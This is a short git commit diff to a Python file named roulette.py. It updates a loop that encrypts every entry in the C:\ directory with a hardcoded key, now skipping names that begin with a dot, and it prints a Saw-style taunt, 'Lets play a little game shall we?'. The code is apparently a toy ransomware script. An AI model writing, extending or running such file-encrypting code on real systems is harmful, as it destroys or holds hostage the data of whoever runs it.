137f9ad863bb57faf33fde1b0a573e324a3cd906
basilthebeagles <johnjoestack@gmail.com>
2015-05-28 10:13:02 -0500

    Update roulette.py

--- roulette.py
+++ roulette.py
@@ -52,11 +52,9 @@ def encrypt_file(key, in_filename, out_filename, chunksize):
 
 
 
-
 for i in os.listdir("C:\\"):
-    
-    encrypt_file("0c92c4e1a35551ed366ca52bf12b6037", i, None, 64*1024)
-
+    if not i.startswith("."):
+        encrypt_file("0c92c4e1a35551ed366ca52bf12b6037", i, None, 64*1024)
 
 #just a fun sad thing I made
 print("Lets play a little game shall we?")
